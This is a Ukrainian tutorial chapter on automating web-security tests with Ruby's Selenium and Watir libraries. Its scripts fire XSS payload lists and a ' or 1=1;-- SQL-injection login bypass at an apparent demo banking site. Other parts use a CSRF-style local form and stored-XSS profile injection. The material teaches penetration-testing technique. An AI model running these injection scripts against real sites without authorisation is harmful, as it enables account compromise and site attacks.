# Маніпуляція переглядачем тенет 
Як хакеру, вам може знадобитися мождивість автоматизації ваших тестів(наприклад XSS) для зменшення кількості помилкових спрацювань, що часту трапляються, особливо в разі тустування на XSS. Традиційна автоматизація залежить від того, що треба знайти, відповіді івд сервера, але все одно, коли щось знаходиться, то це часто неможливо використати на приактиці й все оддно треба перевіряти результати вручну.

Тут ми вивчемо як передати контроль браузером до рубі щоб повторити атаку з переглядача тенет та отримати результат.

Найбільш відомі API для цього - це ***Selenium*** та ***Watir*** які підтримують усі відомі й поширені браузери,

## Selenium Webdriver
[**Selenium**](https://github.com/seleniumhq/selenium) це набір бібілотек та проектів що допомагають автоматизувати роботу з переглядачем. 

- Щоб встановити гем selenium виконайте команду:
```
gem install selenium-webdriver
```


### GET Запит 
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require "selenium-webdriver"

# Profile Setup and Tweak 
proxy = Selenium::WebDriver::Proxy.new(
  :http     => PROXY,
  :ftp      => PROXY,
  :ssl      => PROXY
)       # Set Proxy hostname and port 
profile = Selenium::WebDriver::Firefox::Profile.from_name "default"     # Use an existing profile name 
profile['general.useragent.override'] = "Mozilla/5.0 (compatible; MSIE 9.0; " + 
                                        "Windows Phone OS 7.5; Trident/5.0; " + 
					                    "IEMobile/9.0)"                 # Set User Agent
profile.proxy = proxy                                                   # Set Proxy
profile.assume_untrusted_certificate_issuer = false                     # Accept untrusted SSL certificates 

# Start Driver 
driver = Selenium::WebDriver.for(:firefox, :profile => profile)         # Start firefox driver with specified profile
# driver = Selenium::WebDriver.for(:firefox, :profile => "default")     # Use this line if just need a current profile and no need to setup or tweak your profile
driver.manage.window.resize_to(500, 400)                                # Set Browser windows size
driver.navigate.to "http://www.altoromutual.com/search.aspx?"           # The URL to navigate 

# Interact with elements
element = driver.find_element(:name, 'txtSearch')   # Find an element named 'txtSearch'
element.send_keys "<img src=x onerror='alert(1)'>"  # Send your keys to element
element.send_keys(:control, 't')                    # Open a new tab
element.submit                                      # Submit the text you've just sent
```


> Зверніть увагу, ключі залежать від вашої операційної системи. Наприклад, Mac використовує `COMMAND + t`, замість `CONTROL + t`.


### POST Запит 
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'selenium-webdriver'

browser = Selenium::WebDriver.for :firefox
browser.get "http://www.altoromutual.com/bank/login.aspx"

wait = Selenium::WebDriver::Wait.new(:timeout => 15)		# Set waiting timeout
# Find the input elements to interact with later.
input = wait.until {
  element_user = browser.find_element(:name, "uid")
  element_pass = browser.find_element(:name, "passw")
  # Retrun array of elements when get displayed
  [element_user, element_pass] if element_user.displayed? and element_pass.displayed?
}

input[0].send_keys("' or 1=1;--")   # Send key for the 1st element 
input[1].send_keys("password")      # Send key fro the next element
sleep 1

# Click/submit the button based the form it is in (you can also call 'btnSubmit' method)
submit = browser.find_element(:name, "btnSubmit").click #.submit

# browser.quit
```

Давайте протестуємо сотрінку на наявність XSS вразливостей. Спочатку я напишу список того, що саме для цього треба зробити в переглядачі:

1. Відкрити вікно браузера(Firefox)
2. Перецти до цікавої нам сторінки(altoromutual.com)
3. Зробити певні операції(Відправити XSS код)
4. Перевірити чи спрацював код(Відкрилося спливаєче вікно) чи це помилкове спрацювання 
5. Вивести робочі спрацювання на екран

**selenium-xss.rb**
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'selenium-webdriver'

payloads = 
  [ 
    "<video src=x onerror=alert(1);>",
    "<img src=x onerror='alert(2)'>",
    "<script>alert(3)</script>",
    "<svg/OnlOad=prompt(4)>",
    "javascript:alert(5)",
    "alert(/6/.source)"
  ]

browser = Selenium::WebDriver.for :firefox                  # You can use :ff too
browser.manage.window.resize_to(500, 400)                   # Set browser size
browser.get "http://www.altoromutual.com/search.aspx?"

wait = Selenium::WebDriver::Wait.new(:timeout => 10)        # Timeout to wait 

payloads.each do |payload|
  input = wait.until do
      element = browser.find_element(:name, 'txtSearch')
      element if element.displayed?
  end
  input.send_keys(payload)
  input.submit
  
  begin 
    wait.until do 
      txt = browser.switch_to.alert
      if (1..100) === txt.text.to_i
	    puts "Payload is working: #{payload}"
	    txt.accept 
      end
    end
  rescue Selenium::WebDriver::Error::NoAlertOpenError
    puts "False Positive: #{payload}"
    next
  end
  
end

browser.close
```

Результат:
```
> ruby selenium-xss.rb
Payload is working: <video src=x onerror=alert(1);>
Payload is working: <img src=x onerror='alert(2)'>
Payload is working: <script>alert(3)</script>
Payload is working: <svg/OnlOad=prompt(4)>
False Positive: javascript:alert(5)
False Positive: alert(/6/.source)
```



## Watir Webdriver
[**Watir**](http://watirwebdriver.com/) - це скорочення для "Web Application Testing in Ruby". Я думаю, що Watir більш елегантний ніж Selenium але меня подобається знати кілька шляхів для отримання одного й того ж результату, просто на всяк випадок. 

- Аби встановити гем watir виконайте команду:
```
gem install watir-webdriver
```


### GET Запит 

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'watir-webdriver'

browser = Watir::Browser.new :firefox
browser.goto "http://www.altoromutual.com/search.aspx?"
browser.text_field(name: 'txtSearch').set("<img src=x onerror='alert(1)'>")
btn = browser.button(value: 'Go')
puts btn.exists?
btn.click

# browser.close
```

Іноді вам знадобиться надіслати XSS GET запит з посилання типу `http://app/search?q=<script>alert</script>`. Ви отримаєте дуже знану помилку `Selenium::WebDriver::Error::UnhandledAlertError: Unexpected modal dialog` якщо відкриється вікно алерту. Якщо ж оновити сторінку з тим самим XSS кодом, то все працюватиме, одже наступний код допоможе нам уникнути цієї проблеми:

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'watir-webdriver'

browser = Watir::Browser.new :firefox
wait = Selenium::WebDriver::Wait.new(:timeout => 15)

begin 
    browser.goto("http://www.altoromutual.com/search.aspx?txtSearch=<img src=x onerror=alert(1)>")
rescue Selenium::WebDriver::Error::UnhandledAlertError
    browser.refresh
    wait.until {browser.alert.exists?}
end

if browser.alert.exists? 
  browser.alert.ok
  puts "[+] Exploit found!"
  browser.close
end
```

### POST Запит 

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'watir-webdriver'

browser = Watir::Browser.new :firefox
browser.window.resize_to(800, 600)
browser.window.move_to(0, 0)
browser.goto "http://www.altoromutual.com/bank/login.aspx"
browser.text_field(name: 'uid').set("' or 1=1;-- ")
browser.text_field(name: 'passw').set("password")
btn = browser.button(name: 'btnSubmit').click 

# browser.close
```

> - Оскільки Waiter інтегровано до Selenium, задля досягнення цілі ви можете використовувати обидва
> - В деяких випадках при регістрації чомусь треба виставляти затримку перед введенням логіну/паролю та відправки форми.



## Довільні Post запити в Selenium та Watir
Ось інший сценарій, з яким мені довелося стрітися: Мені треб було робити POST запити при відсутності кнопки "відправити", інакшекажучи, тестувався запит, який робився за допомогою jQuery, в моєму випадку це було випадаюче меню. Я вирішив проблему дуже просто: створив РЕЬД файл, що мав в собі ЗЩЫЕ форму з оригінальними параметрами та кнопку відправлення форми(***приблизно як зробити CSRF експлойт з ЗЩІЕ форми***) далі я викликав цей html файл в переглядачі так, нібито я зайшов на сайт. Давайте подивимося на приклад:

**POST запит**
```
POST /path/of/editfunction HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 100
Cookie: PHPSESSIONID=111111111111111111111
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

field1=""&field2=""&field3=""&field4=""
```

**example.html**
```html
<html>
  <head>
    <title>Victim Site - POST request</title>
  </head>
  <body>
    <form action="https://example.com/path/of/editfunction" method="POST">
      <input type="text" name="field1" value="" />
      <input type="text" name="field2" value="" />
      <input type="text" name="field3" value="" />
      <input type="text" name="field4" value="" />
      <p><input type="submit" value="Send" /></p>
    </form>
  </body>
</html>
```

**exploit.rb**
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'watir-webdriver'

@browser = Watir::Browser.new :firefox
@browser.window.resize_to(800, 600)     # Set browser size
@browser.window.move_to(400, 300)       # Allocate browser position 

def sendpost(payload)
  @browser.goto "file:///home/KING/Code/example.html"

  @browser.text_field(name: 'field1').set(payload)
  @browser.text_field(name: 'field2').set(payload)
  @browser.text_field(name: 'field3').set(payload)
  @browser.text_field(name: 'field4').set(payload)
  sleep 0.1
  @browser.button(value: 'Send').click
end

payloads = 
    [
      '"><script>alert(1)</script>',
      '<img src=x onerror=alert(2)>'
    ]

puts "[*] Exploitation start"
puts "[*] Number of payloads: #{payloads.size} payloads" 
payloads.each do |payload|
  print "\r[*] Trying: #{payload}"
  print "\e[K"
  sendpost payload
  
  if @browser.alert.exists?
    @browser.alert.ok
    puts "[+] Exploit found!: " + payload
    @browser.close
  end 
end
```

### Робота з вкладками
ОДин із сценаріїв,як також мені траплялися була XSS атака на поля вводу в профайлі користувача та перевірка рещультату на іншій сторінці, яка показує публічний профайл користувача. Замість того, щоб перезаходити на сторінку знов і знов, я відкрив нову вкладку браузеру і оновлював її кожного разу. як міняв жанні в профайлі.

**xss_tab.rb**
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'watir-webdriver'
require 'uri'

@url = URI.parse "http://example.com/Users/User_Edit.aspx?userid=68"

@browser = Watir::Browser.new :firefox
@browser.window.resize_to(800, 600)
# @browser.window.move_to(540, 165)
@wait = Selenium::WebDriver::Wait.new(:timeout => 10)

@browser.goto "http://example.com/logon.aspx"

# Login 
@browser.text_field(name: 'Login1$UserName').set("admin")
@browser.text_field(name: 'Login1$Password').set("P@ssword")
sleep 0.5
@browser.button(name: 'Login1$LoginButton').click 

def sendpost(payload)
  begin 

    @browser.switch                                                             # Make sure to focus on current tab/window
    @browser.goto "#{@url.scheme}://#{@url.host}/#{@url.path}?#{@url.query}"    # Goto the URL
    @wait.until {@browser.text_field(id: 'txtFullName').exists?}                # Wait until wanted text area appear 
    @browser.text_field(id: 'txtFullName').set(payload)                         # Set payload to the text area
    @browser.text_field(id: 'txtFirstName').set(payload)                        # Set payload to the text area
    @browser.button(name: '$actionsElem$save').click                            # Click Save button 
    
  rescue Selenium::WebDriver::Error::UnhandledAlertError
    @browser.refresh                            # Refresh the current page
    @wait.until {@browser.alert.exists?}        # Check if alert box appear
  end
end

payloads = 
  [ 
    "\"><video src=x onerror=alert(1);>",
    "<img src=x onerror='alert(2)'>",
    "<script>alert(3)</script>",
    "<svg/OnlOad=prompt(4)>",
    "javascript:alert(5)",
    "alert(/6/.source)"
  ]

puts "[*] Exploitation start"
puts "[*] Number of payloads: #{payloads.size} payloads" 

@browser.send_keys(:control, 't')                               # Sent Ctrl+T to open new tab
@browser.goto "http://example.com/pub_prof/user/silver.aspx"    # Goto the use's public profile
@browser.switch                                                 # Make sure to focus on current tab/window

payloads.each do |payload|
  
  @browser.send_keys(:alt, '1')                                     # Send Alt+1 to go to first tab
  sendpost payload
  puts "[*] Sending to '#{@browser.title}' Payload : #{payload}"
  @browser.send_keys(:alt, '2')                                     # Send Alt+2 to go to second tab
  @browser.switch 
  @browser.refresh
  puts "[*] Checking Payload Result on #{@browser.title}"
  
  if @browser.alert.exists? 
    @browser.alert.ok
    puts 
    puts "[+] Exploit found!: " + payload
    @browser.close
    exit 0
  end
  
end 

@browser.close
puts

```













<br><br><br>
---
- [Selenium official documentations](http://docs.seleniumhq.org/docs/)
- [Selenium Cheat Sheet](https://gist.github.com/kenrett/7553278) 
- [Selenium webdriver vs Watir-webdriver in Ruby](http://watirmelon.com/2011/05/05/selenium-webdriver-vs-watir-webdriver-in-ruby/)
- [Writing automate test scripts in Ruby](https://www.browserstack.com/automate/ruby)
- [Selenium WebDriver and Ruby](https://swdandruby.wordpress.com/)
- [The Selenium Guidebook - Commercial ](https://seleniumguidebook.com/)
- [Watir WebDriver](http://watirwebdriver.com/)
- [Watir Cheat Sheet](https://github.com/watir/watir/wiki/Cheat-Sheet)